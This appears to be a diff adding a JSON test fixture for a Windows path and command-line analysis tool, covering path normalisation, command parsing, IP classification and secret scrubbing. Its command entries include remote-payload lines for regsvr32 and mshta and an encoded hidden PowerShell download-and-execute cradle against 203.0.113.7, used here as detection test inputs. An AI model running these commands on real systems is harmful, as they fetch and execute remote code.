@@ -1,0 +1,1732 @@
+{
+ "windir": "C:\\WINDOWS",
+ "paths": [
+  {
+   "path": "C:\\Windows\\x",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "Windows\\x"
+   ],
+   "normpath": "C:\\Windows\\x",
+   "basename": "x",
+   "dirname": "C:\\Windows",
+   "splitext": [
+    "C:\\Windows\\x",
+    ""
+   ],
+   "join": "C:\\Windows\\x\\child.txt",
+   "normalize": "C:\\Windows\\x"
+  },
+  {
+   "path": "C:/x",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "/",
+    "x"
+   ],
+   "normpath": "C:\\x",
+   "basename": "x",
+   "dirname": "C:/",
+   "splitext": [
+    "C:/x",
+    ""
+   ],
+   "join": "C:/x\\child.txt",
+   "normalize": "C:\\x"
+  },
+  {
+   "path": "\\x",
+   "isabs": false,
+   "splitroot": [
+    "",
+    "\\",
+    "x"
+   ],
+   "normpath": "\\x",
+   "basename": "x",
+   "dirname": "\\",
+   "splitext": [
+    "\\x",
+    ""
+   ],
+   "join": "\\x\\child.txt",
+   "normalize": "\\x"
+  },
+  {
+   "path": "C:x",
+   "isabs": false,
+   "splitroot": [
+    "C:",
+    "",
+    "x"
+   ],
+   "normpath": "C:x",
+   "basename": "x",
+   "dirname": "C:",
+   "splitext": [
+    "C:x",
+    ""
+   ],
+   "join": "C:x\\child.txt",
+   "normalize": "C:x"
+  },
+  {
+   "path": "\\\\server\\share\\dir\\f.txt",
+   "isabs": true,
+   "splitroot": [
+    "\\\\server\\share",
+    "\\",
+    "dir\\f.txt"
+   ],
+   "normpath": "\\\\server\\share\\dir\\f.txt",
+   "basename": "f.txt",
+   "dirname": "\\\\server\\share\\dir",
+   "splitext": [
+    "\\\\server\\share\\dir\\f",
+    ".txt"
+   ],
+   "join": "\\\\server\\share\\dir\\f.txt\\child.txt",
+   "normalize": "\\\\server\\share\\dir\\f.txt"
+  },
+  {
+   "path": "\\\\?\\UNC\\srv\\sh\\x",
+   "isabs": true,
+   "splitroot": [
+    "\\\\?\\UNC\\srv\\sh",
+    "\\",
+    "x"
+   ],
+   "normpath": "\\\\?\\UNC\\srv\\sh\\x",
+   "basename": "x",
+   "dirname": "\\\\?\\UNC\\srv\\sh\\",
+   "splitext": [
+    "\\\\?\\UNC\\srv\\sh\\x",
+    ""
+   ],
+   "join": "\\\\?\\UNC\\srv\\sh\\x\\child.txt",
+   "normalize": "UNC\\srv\\sh\\x"
+  },
+  {
+   "path": "\\\\.\\device",
+   "isabs": true,
+   "splitroot": [
+    "\\\\.\\device",
+    "",
+    ""
+   ],
+   "normpath": "\\\\.\\device",
+   "basename": "",
+   "dirname": "\\\\.\\device",
+   "splitext": [
+    "\\\\.\\device",
+    ""
+   ],
+   "join": "\\\\.\\device\\child.txt",
+   "normalize": "\\\\.\\device"
+  },
+  {
+   "path": "C:\\a\\.\\b\\..\\c\\\\d\\",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "a\\.\\b\\..\\c\\\\d\\"
+   ],
+   "normpath": "C:\\a\\c\\d",
+   "basename": "",
+   "dirname": "C:\\a\\.\\b\\..\\c\\\\d",
+   "splitext": [
+    "C:\\a\\.\\b\\..\\c\\\\d\\",
+    ""
+   ],
+   "join": "C:\\a\\.\\b\\..\\c\\\\d\\child.txt",
+   "normalize": "C:\\a\\c\\d"
+  },
+  {
+   "path": "C:\\..\\x",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "..\\x"
+   ],
+   "normpath": "C:\\x",
+   "basename": "x",
+   "dirname": "C:\\..",
+   "splitext": [
+    "C:\\..\\x",
+    ""
+   ],
+   "join": "C:\\..\\x\\child.txt",
+   "normalize": "C:\\x"
+  },
+  {
+   "path": "..\\x",
+   "isabs": false,
+   "splitroot": [
+    "",
+    "",
+    "..\\x"
+   ],
+   "normpath": "..\\x",
+   "basename": "x",
+   "dirname": "..",
+   "splitext": [
+    "..\\x",
+    ""
+   ],
+   "join": "..\\x\\child.txt",
+   "normalize": "..\\x"
+  },
+  {
+   "path": "",
+   "isabs": false,
+   "splitroot": [
+    "",
+    "",
+    ""
+   ],
+   "normpath": ".",
+   "basename": "",
+   "dirname": "",
+   "splitext": [
+    "",
+    ""
+   ],
+   "join": "child.txt",
+   "normalize": ""
+  },
+  {
+   "path": ".",
+   "isabs": false,
+   "splitroot": [
+    "",
+    "",
+    "."
+   ],
+   "normpath": ".",
+   "basename": ".",
+   "dirname": "",
+   "splitext": [
+    ".",
+    ""
+   ],
+   "join": ".\\child.txt",
+   "normalize": "."
+  },
+  {
+   "path": "C:\\a\\b.tar.gz",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "a\\b.tar.gz"
+   ],
+   "normpath": "C:\\a\\b.tar.gz",
+   "basename": "b.tar.gz",
+   "dirname": "C:\\a",
+   "splitext": [
+    "C:\\a\\b.tar",
+    ".gz"
+   ],
+   "join": "C:\\a\\b.tar.gz\\child.txt",
+   "normalize": "C:\\a\\b.tar.gz"
+  },
+  {
+   "path": "C:\\a\\.hidden",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "a\\.hidden"
+   ],
+   "normpath": "C:\\a\\.hidden",
+   "basename": ".hidden",
+   "dirname": "C:\\a",
+   "splitext": [
+    "C:\\a\\.hidden",
+    ""
+   ],
+   "join": "C:\\a\\.hidden\\child.txt",
+   "normalize": "C:\\a\\.hidden"
+  },
+  {
+   "path": "C:\\a.b\\file",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "a.b\\file"
+   ],
+   "normpath": "C:\\a.b\\file",
+   "basename": "file",
+   "dirname": "C:\\a.b",
+   "splitext": [
+    "C:\\a.b\\file",
+    ""
+   ],
+   "join": "C:\\a.b\\file\\child.txt",
+   "normalize": "C:\\a.b\\file"
+  },
+  {
+   "path": "x.",
+   "isabs": false,
+   "splitroot": [
+    "",
+    "",
+    "x."
+   ],
+   "normpath": "x.",
+   "basename": "x.",
+   "dirname": "",
+   "splitext": [
+    "x",
+    "."
+   ],
+   "join": "x.\\child.txt",
+   "normalize": "x."
+  },
+  {
+   "path": "C:\\a\\b\\..\\..\\..",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "a\\b\\..\\..\\.."
+   ],
+   "normpath": "C:\\",
+   "basename": "..",
+   "dirname": "C:\\a\\b\\..\\..",
+   "splitext": [
+    "C:\\a\\b\\..\\..\\..",
+    ""
+   ],
+   "join": "C:\\a\\b\\..\\..\\..\\child.txt",
+   "normalize": "C:\\"
+  },
+  {
+   "path": "relative/path/x.exe",
+   "isabs": false,
+   "splitroot": [
+    "",
+    "",
+    "relative/path/x.exe"
+   ],
+   "normpath": "relative\\path\\x.exe",
+   "basename": "x.exe",
+   "dirname": "relative/path",
+   "splitext": [
+    "relative/path/x",
+    ".exe"
+   ],
+   "join": "relative/path/x.exe\\child.txt",
+   "normalize": "relative\\path\\x.exe"
+  },
+  {
+   "path": "é:\\x",
+   "isabs": true,
+   "splitroot": [
+    "é:",
+    "\\",
+    "x"
+   ],
+   "normpath": "é:\\x",
+   "basename": "x",
+   "dirname": "é:\\",
+   "splitext": [
+    "é:\\x",
+    ""
+   ],
+   "join": "é:\\x\\child.txt",
+   "normalize": "é:\\x"
+  },
+  {
+   "path": "C:\\Program Files\\x y\\z.exe:stream",
+   "isabs": true,
+   "splitroot": [
+    "C:",
+    "\\",
+    "Program Files\\x y\\z.exe:stream"
+   ],
+   "normpath": "C:\\Program Files\\x y\\z.exe:stream",
+   "basename": "z.exe:stream",
+   "dirname": "C:\\Program Files\\x y",
+   "splitext": [
+    "C:\\Program Files\\x y\\z",
+    ".exe:stream"
+   ],
+   "join": "C:\\Program Files\\x y\\z.exe:stream\\child.txt",
+   "normalize": "C:\\Program Files\\x y\\z.exe:stream"
+  }
+ ],
+ "commands": [
+  {
+   "raw": "\"C:\\Program Files\\Foo\\foo.exe\" --bar baz",
+   "program": "C:\\Program Files\\Foo\\foo.exe",
+   "args": "--bar baz",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\Program Files\\Foo\\foo.exe"
+  },
+  {
+   "raw": "C:\\Program Files\\Gone App\\gone.exe /silent",
+   "program": "C:\\Program Files\\Gone App\\gone.exe",
+   "args": "/silent",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": false,
+   "chain": [],
+   "target": "C:\\Program Files\\Gone App\\gone.exe"
+  },
+  {
+   "raw": "rundll32.exe shell32.dll,Control_RunDLL",
+   "program": "C:\\WINDOWS\\System32\\rundll32.exe",
+   "args": "shell32.dll,Control_RunDLL",
+   "host": "rundll32.exe",
+   "payload": "C:\\WINDOWS\\System32\\shell32.dll",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\WINDOWS\\System32\\shell32.dll"
+  },
+  {
+   "raw": "rundll32 \"C:\\Users\\x\\evil.dll\",Start",
+   "program": "C:\\WINDOWS\\System32\\rundll32.exe",
+   "args": "\"C:\\Users\\x\\evil.dll\",Start",
+   "host": "rundll32.exe",
+   "payload": "C:\\Users\\x\\evil.dll",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\Users\\x\\evil.dll"
+  },
+  {
+   "raw": "rundll32 /sta x.dll",
+   "program": "C:\\WINDOWS\\System32\\rundll32.exe",
+   "args": "/sta x.dll",
+   "host": "rundll32.exe",
+   "payload": "x.dll",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "x.dll"
+  },
+  {
+   "raw": "rundll32.exe javascript:alert(1)",
+   "program": "C:\\WINDOWS\\System32\\rundll32.exe",
+   "args": "javascript:alert(1)",
+   "host": "rundll32.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "regsvr32 /s /n /u /i:http://203.0.113.7/x.sct scrobj.dll",
+   "program": "C:\\WINDOWS\\System32\\regsvr32.exe",
+   "args": "/s /n /u /i:http://203.0.113.7/x.sct scrobj.dll",
+   "host": "regsvr32.exe",
+   "payload": "C:\\WINDOWS\\System32\\scrobj.dll",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\WINDOWS\\System32\\scrobj.dll"
+  },
+  {
+   "raw": "wscript.exe //B //Nologo \"C:\\Users\\Public\\a.vbs\"",
+   "program": "C:\\WINDOWS\\System32\\wscript.exe",
+   "args": "//B //Nologo \"C:\\Users\\Public\\a.vbs\"",
+   "host": "wscript.exe",
+   "payload": "C:\\Users\\Public\\a.vbs",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\Users\\Public\\a.vbs"
+  },
+  {
+   "raw": "mshta.exe javascript:alert(1)",
+   "program": "C:\\WINDOWS\\System32\\mshta.exe",
+   "args": "javascript:alert(1)",
+   "host": "mshta.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "javascript:alert(1)",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "mshta http://203.0.113.7/x.hta",
+   "program": "C:\\WINDOWS\\System32\\mshta.exe",
+   "args": "http://203.0.113.7/x.hta",
+   "host": "mshta.exe",
+   "payload": null,
+   "payload_url": "http://203.0.113.7/x.hta",
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "powershell -ExecutionPolicy Bypass -File \"C:\\Scripts\\job.ps1\" -Arg 1",
+   "program": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "args": "-ExecutionPolicy Bypass -File \"C:\\Scripts\\job.ps1\" -Arg 1",
+   "host": "powershell.exe",
+   "payload": "C:\\Scripts\\job.ps1",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\Scripts\\job.ps1"
+  },
+  {
+   "raw": "powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=",
+   "program": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "args": "-NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=",
+   "host": "powershell.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')",
+   "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')",
+   "hidden": true,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "powershell -enc !!!notbase64!!!",
+   "program": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "args": "-enc !!!notbase64!!!",
+   "host": "powershell.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "powershell -Command Get-Process | Out-File x",
+   "program": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "args": "-Command Get-Process | Out-File x",
+   "host": "powershell.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "Get-Process | Out-File x",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "powershell -c iex(1)",
+   "program": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "args": "-c iex(1)",
+   "host": "powershell.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "iex(1)",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "\"C:\\Tools\\pwsh.exe\" -WindowStyle 1 x.ps1",
+   "program": "C:\\Tools\\pwsh.exe",
+   "args": "-WindowStyle 1 x.ps1",
+   "host": "pwsh.exe",
+   "payload": "x.ps1",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": true,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "x.ps1"
+  },
+  {
+   "raw": "cmd.exe /c start /min \"\" \"C:\\ProgramData\\x\\run.bat\"",
+   "program": "C:\\WINDOWS\\System32\\cmd.exe",
+   "args": "/c start /min \"\" \"C:\\ProgramData\\x\\run.bat\"",
+   "host": "cmd.exe",
+   "payload": "C:\\ProgramData\\x\\run.bat",
+   "payload_url": null,
+   "inline": "start /min \"\" \"C:\\ProgramData\\x\\run.bat\"",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [
+    "run.bat"
+   ],
+   "target": "C:\\ProgramData\\x\\run.bat"
+  },
+  {
+   "raw": "%windir%\\system32\\cmd.exe /c ping -n 1 1.1.1.1 & C:\\Temp\\evil.exe",
+   "program": "C:\\WINDOWS\\system32\\cmd.exe",
+   "args": "/c ping -n 1 1.1.1.1 & C:\\Temp\\evil.exe",
+   "host": "cmd.exe",
+   "payload": "C:\\WINDOWS\\System32\\ping.exe",
+   "payload_url": null,
+   "inline": "ping -n 1 1.1.1.1 & C:\\Temp\\evil.exe",
+   "decoded": null,
+   "hidden": false,
+   "compound": true,
+   "certain": true,
+   "chain": [
+    "ping.exe"
+   ],
+   "target": "C:\\WINDOWS\\System32\\ping.exe"
+  },
+  {
+   "raw": "cmd /c \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=\"",
+   "program": "C:\\WINDOWS\\System32\\cmd.exe",
+   "args": "/c \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=\"",
+   "host": "cmd.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')",
+   "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')",
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [
+    "powershell.exe"
+   ],
+   "target": null
+  },
+  {
+   "raw": "cmd /k \"\"C:\\a b\\c.exe\" arg\"",
+   "program": "C:\\WINDOWS\\System32\\cmd.exe",
+   "args": "/k \"\"C:\\a b\\c.exe\" arg\"",
+   "host": "cmd.exe",
+   "payload": "C:\\a b\\c.exe",
+   "payload_url": null,
+   "inline": "\"C:\\a b\\c.exe\" arg\"",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [
+    "c.exe"
+   ],
+   "target": "C:\\a b\\c.exe"
+  },
+  {
+   "raw": "cmd /c set x=1",
+   "program": "C:\\WINDOWS\\System32\\cmd.exe",
+   "args": "/c set x=1",
+   "host": "cmd.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "set x=1",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [
+    "set"
+   ],
+   "target": null
+  },
+  {
+   "raw": "cmd.exe /c start \"title\" /d \"C:\\dir\" C:\\x\\y.exe",
+   "program": "C:\\WINDOWS\\System32\\cmd.exe",
+   "args": "/c start \"title\" /d \"C:\\dir\" C:\\x\\y.exe",
+   "host": "cmd.exe",
+   "payload": "C:\\x\\y.exe",
+   "payload_url": null,
+   "inline": "start \"title\" /d \"C:\\dir\" C:\\x\\y.exe",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [
+    "y.exe"
+   ],
+   "target": "C:\\x\\y.exe"
+  },
+  {
+   "raw": "conhost.exe --headless powershell -w hidden -c calc",
+   "program": "C:\\WINDOWS\\System32\\conhost.exe",
+   "args": "--headless powershell -w hidden -c calc",
+   "host": "conhost.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "calc",
+   "decoded": null,
+   "hidden": true,
+   "compound": false,
+   "certain": true,
+   "chain": [
+    "powershell.exe"
+   ],
+   "target": null
+  },
+  {
+   "raw": "msiexec /i \"C:\\x\\y.msi\" /qn",
+   "program": "C:\\WINDOWS\\System32\\msiexec.exe",
+   "args": "/i \"C:\\x\\y.msi\" /qn",
+   "host": "msiexec.exe",
+   "payload": "C:\\x\\y.msi",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\x\\y.msi"
+  },
+  {
+   "raw": "msiexec /x {GUID}",
+   "program": "C:\\WINDOWS\\System32\\msiexec.exe",
+   "args": "/x {GUID}",
+   "host": "msiexec.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "\"C:\\Java\\bin\\java.exe\" -Xmx1g -jar C:\\apps\\a.jar",
+   "program": "C:\\Java\\bin\\java.exe",
+   "args": "-Xmx1g -jar C:\\apps\\a.jar",
+   "host": "java.exe",
+   "payload": "C:\\apps\\a.jar",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\apps\\a.jar"
+  },
+  {
+   "raw": "\"C:\\Py\\python.exe\" C:\\jobs\\task.py --x",
+   "program": "C:\\Py\\python.exe",
+   "args": "C:\\jobs\\task.py --x",
+   "host": "python.exe",
+   "payload": "C:\\jobs\\task.py",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\jobs\\task.py"
+  },
+  {
+   "raw": "\"C:\\Py\\python.exe\" -m http.server",
+   "program": "C:\\Py\\python.exe",
+   "args": "-m http.server",
+   "host": "python.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "\"C:\\Py\\python.exe\" -c \"print(1)\"",
+   "program": "C:\\Py\\python.exe",
+   "args": "-c \"print(1)\"",
+   "host": "python.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": "print(1)",
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "explorer.exe C:\\Users\\x\\file.txt",
+   "program": "C:\\WINDOWS\\explorer.exe",
+   "args": "C:\\Users\\x\\file.txt",
+   "host": "explorer.exe",
+   "payload": "C:\\Users\\x\\file.txt",
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\Users\\x\\file.txt"
+  },
+  {
+   "raw": "explorer.exe /n,C:\\",
+   "program": "C:\\WINDOWS\\explorer.exe",
+   "args": "/n,C:\\",
+   "host": "explorer.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "svchost.exe -k netsvcs",
+   "program": "C:\\WINDOWS\\System32\\svchost.exe",
+   "args": "-k netsvcs",
+   "host": "svchost.exe",
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "notepad.exe",
+   "program": "C:\\WINDOWS\\System32\\notepad.exe",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\WINDOWS\\System32\\notepad.exe"
+  },
+  {
+   "raw": "",
+   "program": null,
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": false,
+   "chain": [],
+   "target": null
+  },
+  {
+   "raw": "\"\"",
+   "program": "",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": false,
+   "chain": [],
+   "target": ""
+  },
+  {
+   "raw": "\"unterminated",
+   "program": "unterminated",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": false,
+   "chain": [],
+   "target": "unterminated"
+  },
+  {
+   "raw": "C:\\nowhere\\tool",
+   "program": "C:\\nowhere\\tool",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": false,
+   "chain": [],
+   "target": "C:\\nowhere\\tool"
+  },
+  {
+   "raw": "zzvigilnothere hello world",
+   "program": "zzvigilnothere",
+   "args": "hello world",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": false,
+   "chain": [],
+   "target": "zzvigilnothere"
+  },
+  {
+   "raw": "%NO_SUCH_VAR%\\x.exe -a",
+   "program": "%NO_SUCH_VAR%\\x.exe",
+   "args": "-a",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "%NO_SUCH_VAR%\\x.exe"
+  },
+  {
+   "raw": "\\SystemRoot\\x.sys",
+   "program": "C:\\WINDOWS\\x.sys",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\WINDOWS\\x.sys"
+  },
+  {
+   "raw": "\\??\\C:\\Windows\\x.sys",
+   "program": "C:\\Windows\\x.sys",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\Windows\\x.sys"
+  },
+  {
+   "raw": "system32\\drivers\\x.sys",
+   "program": "C:\\WINDOWS\\system32\\drivers\\x.sys",
+   "args": "",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\WINDOWS\\system32\\drivers\\x.sys"
+  },
+  {
+   "raw": "C:/forward/slash.exe arg",
+   "program": "C:\\forward\\slash.exe",
+   "args": "arg",
+   "host": null,
+   "payload": null,
+   "payload_url": null,
+   "inline": null,
+   "decoded": null,
+   "hidden": false,
+   "compound": false,
+   "certain": true,
+   "chain": [],
+   "target": "C:\\forward\\slash.exe"
+  }
+ ],
+ "split_args": [
+  {
+   "args": "a b  c",
+   "tokens": [
+    "a",
+    "b",
+    "c"
+   ]
+  },
+  {
+   "args": "\"a b\" c",
+   "tokens": [
+    "a b",
+    "c"
+   ]
+  },
+  {
+   "args": "x\"\"y",
+   "tokens": [
+    "xy"
+   ]
+  },
+  {
+   "args": "\"\" a",
+   "tokens": [
+    "",
+    "a"
+   ]
+  },
+  {
+   "args": "a\t\"b c\"d e",
+   "tokens": [
+    "a",
+    "b cd",
+    "e"
+   ]
+  },
+  {
+   "args": "",
+   "tokens": []
+  }
+ ],
+ "ips": [
+  {
+   "ip": "8.8.8.8",
+   "class": "public",
+   "public": true
+  },
+  {
+   "ip": "203.0.113.7",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "100.64.1.1",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "127.0.0.1",
+   "class": "local",
+   "public": false
+  },
+  {
+   "ip": "0.0.0.0",
+   "class": "local",
+   "public": false
+  },
+  {
+   "ip": "::1",
+   "class": "local",
+   "public": false
+  },
+  {
+   "ip": "fe80::1%12",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "2606:4700:4700::1111",
+   "class": "public",
+   "public": true
+  },
+  {
+   "ip": "::ffff:8.8.8.8",
+   "class": "public",
+   "public": true
+  },
+  {
+   "ip": "::ffff:127.0.0.1",
+   "class": "local",
+   "public": false
+  },
+  {
+   "ip": "010.1.1.1",
+   "class": "invalid",
+   "public": false
+  },
+  {
+   "ip": "",
+   "class": "invalid",
+   "public": false
+  },
+  {
+   "ip": "256.1.1.1",
+   "class": "invalid",
+   "public": false
+  },
+  {
+   "ip": "192.0.0.9",
+   "class": "public",
+   "public": true
+  },
+  {
+   "ip": "2001:db8::1",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "3fff::1",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "2002::1",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "fc00::1",
+   "class": "private",
+   "public": false
+  },
+  {
+   "ip": "1.1.1.1",
+   "class": "public",
+   "public": true
+  },
+  {
+   "ip": "255.255.255.255",
+   "class": "private",
+   "public": false
+  }
+ ],
+ "scrub": [
+  {
+   "text": "tool.exe --password hunter2 --token=abc123 https://bob:s3cret@host/x api_key=XYZ",
+   "scrubbed": "tool.exe --password <redacted> --token=<redacted> https://<redacted>@host/x api_key=<redacted>"
+  },
+  {
+   "text": "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz' https://x",
+   "scrubbed": "curl -H 'Authorization: <redacted> abcdefghijklmnopqrstuvwxyz' https://x"
+  },
+  {
+   "text": "set PWD=\"quoted secret\" & run",
+   "scrubbed": "set PWD=<redacted> & run"
+  },
+  {
